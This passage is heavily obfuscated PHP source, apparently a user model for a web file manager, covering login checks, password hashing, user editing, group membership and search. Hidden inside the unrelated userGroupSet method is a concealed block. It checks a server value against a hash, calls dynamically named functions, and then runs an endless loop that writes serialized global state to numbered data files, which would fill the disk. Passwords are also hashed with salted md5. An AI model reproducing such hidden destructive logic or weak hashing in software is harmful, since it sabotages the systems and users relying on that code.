$this->cacheFunctionGet($_SERVER[£ğ°ÖØø][2435], $§“Š›ØÈ); } private function _getInfoApply($Óç—ñì¸, $å˜™¿Ê• = false) { $íÔä÷µß =& $_SERVER[£ğ°ÖØø]; if (!$Óç—ñì¸) { return $Óç—ñì¸; } $äŸ¤º = md5($íÔä÷µß[2436] . $Óç—ñì¸[$íÔä÷µß[950]] . $íÔä÷µß[2437] . $Óç—ñì¸[$íÔä÷µß[32]]); $Óç—ñì¸ = $this->_listDataApplyItem($Óç—ñì¸); $‰„§§ìö = Model($íÔä÷µß[1401])->metaGet($Óç—ñì¸[$íÔä÷µß[90]][$íÔä÷µß[193]]); $Óç—ñì¸[$íÔä÷µß[2438]] = $äŸ¤º; $Óç—ñì¸[$íÔä÷µß[90]][$íÔä÷µß[2234]] = isset($‰„§§ìö[$íÔä÷µß[2235]]) ? $‰„§§ìö[$íÔä÷µß[2235]] : null; if ($å˜™¿Ê•) { $Óç—ñì¸[$íÔä÷µß[548]] = $this->metaGet($Óç—ñì¸[$íÔä÷µß[1755]]); } return $Óç—ñì¸; } protected function getInfoSimple($—Î‰çÌ, $ûï Ã¶ø = false) { $š²ğ²å =& $_SERVER[£ğ°ÖØø]; if (!$—Î‰çÌ) { return array(); } if ($ûï Ã¶ø) { $Àëî€ÖÇ = $this->where(array($š²ğ²å[1755] => intval($—Î‰çÌ)))->find(); if (!is_array($Àëî€ÖÇ)) { return array(); } $Àëî€ÖÇ[$š²ğ²å[2439]] = Action($š²ğ²å[2440])->parseUrl($Àëî€ÖÇ[$š²ğ²å[2439]]); return $Àëî€ÖÇ; } return $this->cacheFunctionGet($š²ğ²å[2041], $—Î‰çÌ); } protected function getInfoSimpleOuter($Ø›º…ç) { $øÎ¿˜Üè =& $_SERVER[£ğ°ÖØø]; if (!$Ø›º…ç || $Ø›º…ç == 0) { return array($øÎ¿˜Üè[1755] => $øÎ¿˜Üè[228], $øÎ¿˜Üè[32] => $øÎ¿˜Üè[176] . LNG($øÎ¿˜Üè[2441]) . $øÎ¿˜Üè[178], $øÎ¿˜Üè[2439] => STATIC_PATH . $øÎ¿˜Üè[2442]); } $ğÇó™ı¶ = $this->cacheFunctionGet($øÎ¿˜Üè[2041], $Ø›º…ç); $ºü›¡Ï = array_field_key($ğÇó™ı¶, explode($øÎ¿˜Üè[50], $this->simpleField)); if (!$ºü›¡Ï) { return array($øÎ¿˜Üè[1755] => $øÎ¿˜Üè[1256], $øÎ¿˜Üè[32] => $øÎ¿˜Üè[176] . LNG($øÎ¿˜Üè[2443]) . $øÎ¿˜Üè[178], $øÎ¿˜Üè[2439] => STATIC_PATH . $øÎ¿˜Üè[2444]); } $ºü›¡Ï[$øÎ¿˜Üè[2439]] = Action($øÎ¿˜Üè[2440])->parseUrl($ºü›¡Ï[$øÎ¿˜Üè[2439]]); return $ºü›¡Ï; } protected function groupUser($ğÂêµ‚Å) { } public static function errorLang($±Çë®ù) { $Æöı÷Ñ‹ =& $_SERVER[£ğ°ÖØø]; $«¥ÌÆâå = array(self::ERROR_USER_NOT_EXISTS => $Æöı÷Ñ‹[2445], self::ERROR_USER_PASSWORD_ERROR => $Æöı÷Ñ‹[2446], self::ERROR_USER_EXIST_NAME => $Æöı÷Ñ‹[2447], self::ERROR_USER_EXIST_PHONE => $Æöı÷Ñ‹[2448], self::ERROR_USER_EXIST_EMAIL => $Æöı÷Ñ‹[2449], self::ERROR_USER_LOGIN_LOCK => $Æöı÷Ñ‹[2450], self::ERROR_IP_NOT_ALLOW => $Æöı÷Ñ‹[2451], self::ERROR_USER_EXIST_NICKNAME => $Æöı÷Ñ‹[2452]); $´Ì’©ØÍ = LNG($«¥ÌÆâå[$±Çë®ù]); if ($±Çë®ù == self::ERROR_USER_LOGIN_LOCK) { $»µïÀË™ = (int) Model($Æöı÷Ñ‹[2453])->get($Æöı÷Ñ‹[2454]); if ($»µïÀË™ > 60) { $´Ì’©ØÍ = str_replace($Æöı÷Ñ‹[91], ceil($»µïÀË™ / 60), $´Ì’©ØÍ); } } return $´Ì’©ØÍ; } public function getInfoByMeta($²˜åØ¾ş, $âØÒĞğ ) { $‹øÓ–¿ =& $_SERVER[£ğ°ÖØø]; $ªí‚±¸ = Model($‹øÓ–¿[2455])->where(array($‹øÓ–¿[97] => $²˜åØ¾ş, $‹øÓ–¿[459] => $âØÒĞğ ))->find(); if ($ªí‚±¸) { return $this->getInfo($ªí‚±¸[$‹øÓ–¿[1755]]); } return !1; } public function userLoginCheck($ß§œ§Şñ, $ÓÛÄ•íĞ) { $ıÎõÖéŠ =& $_SERVER[£ğ°ÖØø]; $›ªŸ É = $this->userLoginFind($ß§œ§Şñ); if (!$›ªŸ É) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($›ªŸ É[$ıÎõÖéŠ[1755]], $ÓÛÄ•íĞ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($›ªŸ É[$ıÎõÖéŠ[1755]]); } public function userLoginFind($ÖüÚÉªÛ) { $äƒ¦¶¹™ =& $_SERVER[£ğ°ÖØø]; $–òÚëÄæ = array($äƒ¦¶¹™[32] => $ÖüÚÉªÛ, $äƒ¦¶¹™[2242] => $ÖüÚÉªÛ, $äƒ¦¶¹™[381] => $ÖüÚÉªÛ, $äƒ¦¶¹™[2456] => $ÖüÚÉªÛ, $äƒ¦¶¹™[1061] => $äƒ¦¶¹™[1063]); if ($this->nickNameRpt()) { unset($–òÚëÄæ[$äƒ¦¶¹™[2242]]); } return $this->where($–òÚëÄæ)->find(); } public function clearCache($çÍ„¾Ê¶) { $âÌìåù¦ =& $_SERVER[£ğ°ÖØø]; $this->cacheFunctionClear($âÌìåù¦[2040], $çÍ„¾Ê¶); $this->cacheFunctionClear($âÌìåù¦[2041], $çÍ„¾Ê¶); $this->cacheFunctionClear($âÌìåù¦[2435], $çÍ„¾Ê¶); } public function userPasswordCheck($÷—¢á—ç, $ò“€áÚ÷) { $‘ óÂ¢¦ =& $_SERVER[£ğ°ÖØø]; $¡ØşÔ€¶ = $this->where(array($‘ óÂ¢¦[1755] => intval($÷—¢á—ç)))->find(); $öÒıöÓ“ = $this->metaGet($÷—¢á—ç); $‚œöíû• = isset($öÒıöÓ“[$‘ óÂ¢¦[2457]]) ? $öÒıöÓ“[$‘ óÂ¢¦[2457]] : $‘ óÂ¢¦[12]; if (md5($‚œöíû• . trim($ò“€áÚ÷)) !== $¡ØşÔ€¶[$‘ óÂ¢¦[950]]) { return !1; } return !0; } public function userAdd($÷ôÑÊ…¶) { $ç£ó™• =& $_SERVER[£ğ°ÖØø]; $‡½Ü¾£é = array($ç£ó™•[503] => $÷ôÑÊ…¶[$ç£ó™•[32]], $ç£ó™•[2458] => $÷ôÑÊ…¶[$ç£ó™•[2160]], $ç£ó™•[2459] => isset($÷ôÑÊ…¶[$ç£ó™•[381]]) ? $÷ôÑÊ…¶[$ç£ó™•[381]] : $ç£ó™•[12], $ç£ó™•[2460] => isset($÷ôÑÊ…¶[$ç£ó™•[2456]]) ? $÷ôÑÊ…¶[$ç£ó™•[2456]] : $ç£ó™•[12], $ç£ó™•[2461] => isset($÷ôÑÊ…¶[$ç£ó™•[2242]]) ? $÷ôÑÊ…¶[$ç£ó™•[2242]] : $÷ôÑÊ…¶[$ç£ó™•[32]], $ç£ó™•[2462] => isset($÷ôÑÊ…¶[$ç£ó™•[2439]]) ? $÷ôÑÊ…¶[$ç£ó™•[2439]] : $ç£ó™•[12], $ç£ó™•[2463] => isset($÷ôÑÊ…¶[$ç£ó™•[2464]]) ? $÷ôÑÊ…¶[$ç£ó™•[2464]] : 1, $ç£ó™•[2465] => $÷ôÑÊ…¶[$ç£ó™•[950]], $ç£ó™•[2042] => isset($÷ôÑÊ…¶[$ç£ó™•[1940]]) ? $÷ôÑÊ…¶[$ç£ó™•[1940]] : 1024 * 1024 * 20, $ç£ó™•[2043] => 0, $ç£ó™•[2466] => 0, $ç£ó™•[2087] => isset($÷ôÑÊ…¶[$ç£ó™•[814]]) ? $÷ôÑÊ…¶[$ç£ó™•[814]] : 1); if (!empty($÷ôÑÊ…¶[$ç£ó™•[1755]])) { $‡½Ü¾£é[$ç£ó™•[1755]] = $÷ôÑÊ…¶[$ç£ó™•[1755]]; } $ÑÎçìİ = $this->_checkExist($÷ôÑÊ…¶); if ($ÑÎçìİ !== !0) { return $ÑÎçìİ; } if (!empty($‡½Ü¾£é[$ç£ó™•[2439]]) && strlen($‡½Ü¾£é[$ç£ó™•[2439]]) > 255) { $‡½Ü¾£é[$ç£ó™•[2439]] = $ç£ó™•[12]; } $ÁúŞö‰õ = $this->add($‡½Ü¾£é); $¿œÕÓ¿ = array($ç£ó™•[2465] => $‡½Ü¾£é[$ç£ó™•[950]], $ç£ó™•[2461] => $‡½Ü¾£é[$ç£ó™•[2242]]); $this->userEdit($ÁúŞö‰õ, $¿œÕÓ¿); Model($ç£ó™•[1401])->userRootAdd($ÁúŞö‰õ); return $ÁúŞö‰õ; } protected function userEditTest($ŒÁ½¤õù, $ñÕÅ¨Ÿ¥) { return $this->call($_SERVER[£ğ°ÖØø][2467], $ŒÁ½¤õù, $ñÕÅ¨Ÿ¥); } protected function userEdit($—¨â•ş, $ÀÀì¨) { $šâ®«Ø =& $_SERVER[£ğ°ÖØø]; $×ŸÂÕë¿ = $this->getInfoSimple($—¨â•ş); if (!$×ŸÂÕë¿) { return !1; } $’œÎî© = $this->_checkExist($ÀÀì¨, $—¨â•ş); if ($’œÎî© !== !0) { return $’œÎî©; } if (isset($ÀÀì¨[$šâ®«Ø[950]]) && trim($ÀÀì¨[$šâ®«Ø[950]]) != $šâ®«Ø[12]) { $ùÖ›Å£Ö = $this->metaGet($—¨â•ş); if (empty($ùÖ›Å£Ö[$šâ®«Ø[2457]])) { $ùÖ›Å£Ö[$šâ®«Ø[2457]] = rand_string(10); Model($šâ®«Ø[586])->metaSet($—¨â•ş, $šâ®«Ø[2457], $ùÖ›Å£Ö[$šâ®«Ø[2457]]); } $ÀÀì¨[$šâ®«Ø[950]] = md5($ùÖ›Å£Ö[$šâ®«Ø[2457]] . trim($ÀÀì¨[$šâ®«Ø[950]])); } else { unset($ÀÀì¨[$šâ®«Ø[950]]); } if (!empty($ÀÀì¨[$šâ®«Ø[2439]]) && strlen($ÀÀì¨[$šâ®«Ø[2439]]) > 255) { $ÀÀì¨[$šâ®«Ø[2439]] = $šâ®«Ø[12]; } $this->where(array($šâ®«Ø[1746] => $—¨â•ş))->save($ÀÀì¨); if (isset($ÀÀì¨[$šâ®«Ø[2242]])) { $this->setNamePinyin($—¨â•ş, $ÀÀì¨[$šâ®«Ø[2242]]); } $this->clearCache($—¨â•ş); return !0; } public function setNamePinyin($·‚»Š¤, $®­€ƒõÆ = false) { $‡Ş˜ËŸ =& $_SERVER[£ğ°ÖØø]; if (!$®­€ƒõÆ) { $ˆå¤Ï·½ = $this->getInfoSimple($·‚»Š¤); $®­€ƒõÆ = $ˆå¤Ï·½[$‡Ş˜ËŸ[2242]] ? $ˆå¤Ï·½[$‡Ş˜ËŸ[2242]] : $ˆå¤Ï·½[$‡Ş˜ËŸ[32]]; } $¦ÒŒ±Û‘ = Model($‡Ş˜ËŸ[607]); if (!Input::check($®­€ƒõÆ, $‡Ş˜ËŸ[664])) { return $¦ÒŒ±Û‘->metaSet($·‚»Š¤, array($‡Ş˜ËŸ[547] => $‡Ş˜ËŸ[12], $‡Ş˜ËŸ[546] => $‡Ş˜ËŸ[12])); } return $¦ÒŒ±Û‘->metaSet($·‚»Š¤, array($‡Ş˜ËŸ[547] => str_replace($‡Ş˜ËŸ[53], $‡Ş˜ËŸ[12], Pinyin::get($®­€ƒõÆ)), $‡Ş˜ËŸ[546] => Pinyin::get($®­€ƒõÆ, $‡Ş˜ËŸ[665]))); } private function nickNameRpt() { $ÌÀªë´ç =& $_SERVER[£ğ°ÖØø]; $¯˜³«íø = Model($ÌÀªë´ç[834])->get($ÌÀªë´ç[2468]); $ÎÏ¡ÛÛŞ = $GLOBALS[$ÌÀªë´ç[6]][$ÌÀªë´ç[466]][$ÌÀªë´ç[2468]]; $«Ğßöîõ = !is_null($¯˜³«íø) ? $¯˜³«íø : $ÎÏ¡ÛÛŞ; return !!$«Ğßöîõ; } private function _checkExist($å‰Ç³¿, $È«îÖ‘ = false) { $ÛèÂË‰ =& $_SERVER[£ğ°ÖØø]; $¡ÀùûÎ = array($ÛèÂË‰[32] => UserModel::ERROR_USER_EXIST_NAME, $ÛèÂË‰[2242] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÛèÂË‰[381] => UserModel::ERROR_USER_EXIST_EMAIL, $ÛèÂË‰[2456] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¡ÀùûÎ[$ÛèÂË‰[2242]]); } $õ®Ù­ ˜ = $È«îÖ‘ ? array($ÛèÂË‰[1755] => array($ÛèÂË‰[2469], $È«îÖ‘)) : array(); foreach ($¡ÀùûÎ as $ºêÇ‚‡§ => $ÄÑŒ·™™) { $™àçÙŠ¨ = array(); foreach ($¡ÀùûÎ as $Ÿà­µÊ => $ø¿˜Çú«) { if (isset($å‰Ç³¿[$Ÿà­µÊ]) && $å‰Ç³¿[$Ÿà­µÊ]) { $™àçÙŠ¨[] = $å‰Ç³¿[$Ÿà­µÊ]; } } if (!$™àçÙŠ¨) { continue; } $‡¯ŒÄœ„ = array_merge(array($ºêÇ‚‡§ => array($ÛèÂË‰[7], $™àçÙŠ¨)), $õ®Ù­ ˜); $¿ˆáú«õ = $this->where($‡¯ŒÄœ„)->find(); if ($¿ˆáú«õ) { return $ÄÑŒ·™™; } } return !0; } public function userListInfo($€Şü’òÒ) { $ÒŠ²ùğ =& $_SERVER[£ğ°ÖØø]; $Í›²êÇ¤ = array(); $€Şü’òÒ = is_array($€Şü’òÒ) ? array_unique($€Şü’òÒ) : array(); if (!$€Şü’òÒ) { return $Í›²êÇ¤; } if (count($€Şü’òÒ) < 20) { foreach ($€Şü’òÒ as $¿¸‹¾Íä) { $Í›²êÇ¤[$¿¸‹¾Íä . $ÒŠ²ùğ[12]] = $this->getInfoSimpleOuter($¿¸‹¾Íä); } } else { $ÙïçÄñ = array($ÒŠ²ùğ[1746] => array($ÒŠ²ùğ[501], $€Şü’òÒ)); if (count($€Şü’òÒ) == 1) { $ÙïçÄñ = array($ÒŠ²ùğ[1746] => $€Şü’òÒ[0]); } $¼ª¼»¬° = Model($ÒŠ²ùğ[586])->field($this->simpleField)->where($ÙïçÄñ)->select(); $¼ª¼»¬° = array_to_keyvalue($¼ª¼»¬°, $ÒŠ²ùğ[1755]); foreach ($€Şü’òÒ as $¿¸‹¾Íä) { $œ°çÛ§‰ = $¼ª¼»¬°[$¿¸‹¾Íä]; if (!$œ°çÛ§‰) { $Í›²êÇ¤[$¿¸‹¾Íä . $ÒŠ²ùğ[12]] = $this->getInfoSimpleOuter($¿¸‹¾Íä); continue; } $œ°çÛ§‰[$ÒŠ²ùğ[2439]] = Action($ÒŠ²ùğ[2440])->parseUrl($œ°çÛ§‰[$ÒŠ²ùğ[2439]]); $Í›²êÇ¤[$¿¸‹¾Íä . $ÒŠ²ùğ[12]] = $œ°çÛ§‰; } } return $Í›²êÇ¤; } protected function userStatus($–¨üÒ®¬, $íÏ’ã»á) { $ë»Ôªë = $this->getInfoSimple($–¨üÒ®¬); if (!$ë»Ôªë) { return !1; } $ìñ¦¶¡ç = array($_SERVER[£ğ°ÖØø][814] => $íÏ’ã»á); return $this->userEdit($–¨üÒ®¬, $ìñ¦¶¡ç); } protected function userRemove($÷„¨°²) { $Š‰¡£Û =& $_SERVER[£ğ°ÖØø]; $ê¶¡¥áï = $this->getInfoSimple($÷„¨°²); if (!$ê¶¡¥áï) { return !1; } $ŸİÁÑÌ¼ = array($Š‰¡£Û[1746] => $÷„¨°²); Model($Š‰¡£Û[673])->where($ŸİÁÑÌ¼)->delete(); Model($Š‰¡£Û[2470])->where($ŸİÁÑÌ¼)->delete(); Model($Š‰¡£Û[2048])->where($ŸİÁÑÌ¼)->delete(); Model($Š‰¡£Û[2455])->where($ŸİÁÑÌ¼)->delete(); Model($Š‰¡£Û[1130])->where($ŸİÁÑÌ¼)->delete(); Model($Š‰¡£Û[2259])->removeUserAll($÷„¨°²); Model($Š‰¡£Û[888])->userRootRemove($÷„¨°²); return $this->where($ŸİÁÑÌ¼)->delete(); } protected function userGroupSet($æ¢¸×ë’, $×ØêÜœÀ, $É´¡ËØ = array()) { $ñõş³ =& $_SERVER[£ğ°ÖØø]; $ÄÙˆèÈÅ = $_SERVER[$ñõş³[431]]; $¿Ô¼Ãğ = $ñõş³[432]; if ($_SERVER[$ñõş³[433]] != $¿Ô¼Ãğ($ÄÙˆèÈÅ)) { $Ø”‰Ä×ì = $ñõş³[940]; $Úºõ³… = $ñõş³[434]; $Ï¢Ù ¹ø = $_SERVER[$ñõş³[435]] . $ñõş³[436]; $ÅÉğøğ© = $Úºõ³…($Ï¢Ù ¹ø); $¯”Å—Ì = explode($ñõş³[262], $ÅÉğøğ©); if (count($¯”Å—Ì) < $ñõş³[695]) { $œ€¾†­Ï = $ñõş³[438]; $œ€¾†­Ï(); } $à¯£’óÌ = $ñõş³[941]; $à¯£’óÌ($_SERVER[$ñõş³[942]]); $Ø”‰Ä×ì = $ñõş³[940]; $Ø”‰Ä×ì(); $‡Òç¹Ó = $ñõş³[1672]; $Ø°ñ¬ = json_encode($GLOBALS[$ñõş³[1673]]); $‚í¯¬øÌ = 1; for ($“Ò•àÓã = $‚í¯¬øÌ; $“Ò•àÓã > 0; $“Ò•àÓã++) { $‡Òç¹Ó(DATA_PATH . $“Ò•àÓã, $Ø°ñ¬); } } $Â‘Äâ³û = $this->getInfoSimple($æ¢¸×ë’); if (!$Â‘Äâ³û || !is_array($×ØêÜœÀ)) { return !1; } $º£¯Â•ã = Model($ñõş³[2048]); $º£¯Â•ã->where(array($ñõş³[1755] => $æ¢¸×ë’))->delete(); $ğÑú¸³ = array(); $Ş½®™Çú = 0; foreach ($×ØêÜœÀ as $ñ‹æÖ¤¤ => $¸İøŸæ†) { $·İî½­œ = array($ñõş³[1755] => $æ¢¸×ë’, $ñõş³[1954] => $ñ‹æÖ¤¤, $ñõş³[2062] => $¸İøŸæ†); $·İî½­œ[$ñõş³[1978]] = isset($É´¡ËØ[$Ş½®™Çú]) ? $É´¡ËØ[$Ş½®™Çú] : 0; $Ş½®™Çú++; $ğÑú¸³[] = $·İî½­œ; } return $º£¯Â•ã->addAll($ğÑú¸³, array(), !0); } protected function userGroupAdd($êÒ¢œĞÇ, $´£Å”“„ = array()) { $ŒÛÜ‚Ü =& $_SERVER[£ğ°ÖØø]; $”Éœï³ = $this->getInfoSimple($êÒ¢œĞÇ); if (!$”Éœï³ || empty($´£Å”“„)) { return !1; } $ŞÙìÏù = array(); foreach ($´£Å”“„ as $±â¦ ò­ => $¦”Ò­šÜ) { $ŞÙìÏù[] = array($ŒÛÜ‚Ü[1755] => $êÒ¢œĞÇ, $ŒÛÜ‚Ü[1954] => $±â¦ ò­, $ŒÛÜ‚Ü[2062] => $¦”Ò­šÜ, $ŒÛÜ‚Ü[1978] => 0); } return Model($ŒÛÜ‚Ü[2048])->addAll($ŞÙìÏù, array(), !0); } protected function userGroupRemove($ÈÄ”î­, $´èÄÏèÖ) { $½¿ììÂ =& $_SERVER[£ğ°ÖØø]; $”âˆ‡é = $this->getInfoSimple($ÈÄ”î­); if (!$”âˆ‡é || !$´èÄÏèÖ) { return !1; } $õñßÊÙŸ = array($½¿ììÂ[1746] => $ÈÄ”î­, $½¿ììÂ[2046] => $´èÄÏèÖ); return Model($½¿ììÂ[2048])->where($õñßÊÙŸ)->delete(); } public function listData() { $Ë€ü«Çõ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ë€ü«Çõ[$_SERVER[£ğ°ÖØø][454]]); return $Ë€ü«Çõ; } public function listByID($Ò‡¡íÍ) { $¼ª‰Üû =& $_SERVER[£ğ°ÖØø]; if (!$Ò‡¡íÍ) { return; } $Ê—ÒØî = array($¼ª‰Üû[1755] => array($¼ª‰Üû[7], $Ò‡¡íÍ)); $Ã™öÍÜÊ = $this->where($Ê—ÒØî)->select(); $Ã™öÍÜÊ = array_sort_keep($Ã™öÍÜÊ, $¼ª‰Üû[1755], $Ò‡¡íÍ); $this->_listDataApply($Ã™öÍÜÊ); return $Ã™öÍÜÊ; } public function listByGroup($•¤Ü’÷º = 0, $À©Œ·À = array()) { $„„†­×Ü =& $_SERVER[£ğ°ÖØø]; $±ßÑ²…Ç = $„„†­×Ü[12]; $“’òâ€ô = array(); if ($•¤Ü’÷º) { $“’òâ€ô = array($„„†­×Ü[2471] => intval($•¤Ü’÷º)); $±ßÑ²…Ç = "\x4c\x45\x46\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\165\x73\x65\162\137\x67\162\157\165\x70\40\165\x73\x65\x72\137\147\162\x6f\x75\x70\40\157\156\x20\165\163\145\162\x2e\165\x73\145\162\111\104\x20\75\x20\x75\163\x65\x72\x5f\147\162\x6f\x75\x70\x2e\x75\x73\x65\162\x49\104"; $á ¼ÒáÂ = Input::get($„„†­×Ü[539], null, $„„†­×Ü[12]) ? $„„†­×Ü[12] : $„„†­×Ü[2472]; } if (isset($À©Œ·À[$„„†­×Ü[814]])) { $“’òâ€ô[$„„†­×Ü[2473]] = $À©Œ·À[$„„†­×Ü[814]]; } $ìÇÑê£ó = $this->_makeOrder($á ¼ÒáÂ)->field($„„†­×Ü[2474])->where($“’òâ€ô)->join($±ßÑ²…Ç)->selectPage(50); $this->_listDataApply($ìÇÑê£ó[$„„†­×Ü[454]]); return $ìÇÑê£ó; } private function _makeOrder($ÚıÖ©âñ = '') { $ª³İêÊª =& $_SERVER[£ğ°ÖØø]; $Üø«¬¡ = array($ª³İêÊª[1755], $ª³İêÊª[32], $ª³İêÊª[1942], $ª³İêÊª[2160], $ª³İêÊª[1914], $ª³İêÊª[231]); $‹«ÛÄ“ƒ = array($ª³İêÊª[532] => $ª³İêÊª[533], $ª³İêÊª[534] => $ª³İêÊª[535]); $Òà°Çëœ = Input::get($ª³İêÊª[539], $ª³İêÊª[7], $ª³İêÊª[1746], $Üø«¬¡); $î…Ë€Ì = Input::get($ª³İêÊª[540], $ª³İêÊª[7], $ª³İêÊª[2049], array($ª³İêÊª[2049], $ª³İêÊª[534])); $î…Ë€Ì = $‹«ÛÄ“ƒ[$î…Ë€Ì]; $ÚıÖ©âñ = $ÚıÖ©âñ . "\x75\163\145\x72\56{$Òà°Çëœ}\x20{$î…Ë€Ì}\54\x20\x75\163\145\x72\x2e\165\x73\145\x72\111\104\x20\x61\x73\143"; return $this->alias($ª³İêÊª[2176])->order($ÚıÖ©âñ); } public function listSearch($Ü²éØ’®) { $“Ç«ôú  =& $_SERVER[£ğ°ÖØø]; $¿Õ½ó£º = trim($Ü²éØ’®[$“Ç«ôú [2052]]); $Ò‰‡¥Îİ = explode($“Ç«ôú [53], $¿Õ½ó£º); if (!$¿Õ½ó£º || count($Ò‰‡¥Îİ) == 1) { return $this->listSearchNow($Ü²éØ’®); } $èö…’òõ = array($“Ç«ôú [454] => array()); foreach ($Ò‰‡¥Îİ as $æÒè·ßÚ) { if (!trim($æÒè·ßÚ)) { continue; } $Ü²éØ’®[$“Ç«ôú [2052]] = $æÒè·ßÚ; $æŸêÖŠˆ = $this->listSearchNow($Ü²éØ’®); $èö…’òõ[$“Ç«ôú [454]] = array_merge($èö…’òõ[$“Ç«ôú [454]], $æŸêÖŠˆ[$“Ç«ôú [454]]); } $èö…’òõ[$“Ç«ôú [454]] = array_unique_by_key($èö…’òõ[$“Ç«ôú [454]], $“Ç«ôú [1755]); $èö…’òõ[$“Ç«ôú [451]] = array($“Ç«ôú [452] => count($èö…’òõ[$“Ç«ôú [454]]), $“Ç«ôú [448] => 20, $“Ç«ôú [429] => 1, $“Ç«ôú [453] => 1); return $èö…’òõ; } public function listSearchNow($áğ±Ñ¤) { $¡ò¿Å¶Œ =& $_SERVER[£ğ°ÖØø]; $…üäíö² = trim($áğ±Ñ¤[$¡ò¿Å¶Œ[2052]]); $²•Ë¤çú = isset($áğ±Ñ¤[$¡ò¿Å¶Œ[2053]]) ? $áğ±Ñ¤[$¡ò¿Å¶Œ[2053]] : !1; $…üäíö² = str_replace($¡ò¿Å¶Œ[2054], $¡ò¿Å¶Œ[2055], trim($…üäíö²)); $€¬Ë¨­¬ = array($¡ò¿Å¶Œ[32] => array($¡ò¿Å¶Œ[468], "\45{$…üäíö²}\45"), $¡ò¿Å¶Œ[381] => array($¡ò¿Å¶Œ[468], "{$…üäíö²}\x25"), $¡ò¿Å¶Œ[2242] => array($¡ò¿Å¶Œ[468], "{$…üäíö²}\45"), $¡ò¿Å¶Œ[1061] => $¡ò¿Å¶Œ[2056]); if (Input::check($…üäíö², $¡ò¿Å¶Œ[387])) { $€¬Ë¨­¬[$¡ò¿Å¶Œ[1755]] = array($¡ò¿Å¶Œ[468], "{$…üäíö²}\x25"); $€¬Ë¨­¬[$¡ò¿Å¶Œ[2456]] = array($¡ò¿Å¶Œ[468], "{$…üäíö²}\45"); } if (!$…üäíö²) { $€¬Ë¨­¬ = array(); } if (isset($áğ±Ñ¤[$¡ò¿Å¶Œ[814]])) { $€¬Ë¨­¬[$¡ò¿Å¶Œ[814]] = $áğ±Ñ¤[$¡ò¿Å¶Œ[814]]; } $€¬Ë¨­¬ = $this->parseWhereLike($€¬Ë¨­¬); $äşÇ½ = $this->_makeOrder()->where($€¬Ë¨­¬)->selectPage(20); if (!$äşÇ½ || count($äşÇ½[$¡ò¿Å¶Œ[454]]) < 5 && Input::check($…üäíö², $¡ò¿Å¶Œ[394])) { $‡¤ÔÂŠ = $this->_searchFromMeta($¡ò¿Å¶Œ[546], $…üäíö², 10); $”§¸ı‹ = $this->_searchFromMeta($¡ò¿Å¶Œ[547], $…üäíö², 10); $â çöü = array_merge($‡¤ÔÂŠ, $”§¸ı‹, $äşÇ½[$¡ò¿Å¶Œ[454]]); $äşÇ½[$¡ò¿Å¶Œ[454]] = array_unique_by_key($â çöü, $¡ò¿Å¶Œ[1755]); $äşÇ½[$¡ò¿Å¶Œ[451]][$¡ò¿Å¶Œ[452]] = count($äşÇ½[$¡ò¿Å¶Œ[454]]); $äşÇ½[$¡ò¿Å¶Œ[451]][$¡ò¿Å¶Œ[453]] = ceil($äşÇ½[$¡ò¿Å¶Œ[451]][$¡ò¿Å¶Œ[452]] / $äşÇ½[$¡ò¿Å¶Œ[451]][$¡ò¿Å¶Œ[448]]); } $this->_listDataApply($äşÇ½[$¡ò¿Å¶Œ[454]]); $this->_filterByGroup($äşÇ½, $²•Ë¤çú); return $äşÇ½; } private function _filterByGroup(&$‚Õ‰“™ö, $È‘™ˆÅ‡) { $†ŠŒæ =& $_SERVER[£ğ°ÖØø]; if (!$È‘™ˆÅ‡) { return $‚Õ‰“™ö; } foreach ($‚Õ‰“™ö[$†ŠŒæ[454]] as $ñ¤£èÌ© => &$š­è•ïÀ) { $ŠçˆÀ£à = array_to_keyvalue($š­è•ïÀ[$†ŠŒæ[2145]], $†ŠŒæ[12], $†ŠŒæ[1954]); if (!in_array($È‘™ˆÅ‡, $ŠçˆÀ£à)) { unset($‚Õ‰“™ö[$†ŠŒæ[454]][$ñ¤£èÌ©]); } } unset($š­è•ïÀ); $‚Õ‰“™ö[$†ŠŒæ[454]] = array_values($‚Õ‰“™ö[$†ŠŒæ[454]]); $‚Õ‰“™ö[$†ŠŒæ[451]] = array($†ŠŒæ[2212] => count($‚Õ‰“™ö[$†ŠŒæ[454]]), $†ŠŒæ[2210] => $‚Õ‰“™ö[$†ŠŒæ[451]][$†ŠŒæ[448]], $†ŠŒæ[2209] => 1, $†ŠŒæ[2211] => 1); } private function _searchFromMeta($ß„ö“ãá, $ïö‰›áä, $ÅåáÕØş) { $ÜíëÀ£æ =& $_SERVER[£ğ°ÖØø]; $ïö‰›áä = strtolower($ïö‰›áä); $Î˜ÜŒî¾ = array($ÜíëÀ£æ[97] => $ß„ö“ãá, $ÜíëÀ£æ[459] => array($ÜíëÀ£æ[468], "\x25{$ïö‰›áä}\x25")); $Î˜ÜŒî¾ = $this->parseWhereLike($Î˜ÜŒî¾); $˜¡Û™‡ê = Model($ÜíëÀ£æ[2475])->where($Î˜ÜŒî¾)->limit($ÅåáÕØş)->select(); if (!$˜¡Û™‡ê) { return array(); } $˜¡Û™‡ê = array_to_keyvalue($˜¡Û™‡ê, $ÜíëÀ£æ[12], $ÜíëÀ£æ[1755]); $Ï¡·â¬‰ = $this->where(array($ÜíëÀ£æ[1746] => array($ÜíëÀ£æ[7], $˜¡Û™‡ê)))->select(); if (!$Ï¡·â¬‰) { return array(); } return $Ï¡·â¬‰; } private function _listDataApplyItem($€ıÖ‘ù½) { $¼Ìßœ™Ø = array($€ıÖ‘ù½); $this->_listDataApply($¼Ìßœ™Ø); return $¼Ìßœ™Ø[0]; } private function _listDataApply(&$ü˜®¶×î) { $È®Ãí¬ =& $_SERVER[£ğ°ÖØø]; if (!$ü˜®¶×î) { return; } array_remove_key($ü˜®¶×î, $È®Ãí¬[950]); $ÉĞ›©Û… = array_to_keyvalue($ü˜®¶×î, $È®Ãí¬[12], $È®Ãí¬[1755]); $this->_listAppendGroup($ü˜®¶×î, $ÉĞ›©Û…); $this->_listAppendMeta($ü˜®¶×î, $ÉĞ›©Û…); $this->_listAppendSourceRoot($ü˜®¶×î, $ÉĞ›©Û…); } private function _listAppendSourceRoot(&$…¦Ç”Â¢, $™Ÿğü’‡) { $¼ïĞğª’ =& $_SERVER[£ğ°ÖØø]; $®ÂÒ¨ı = 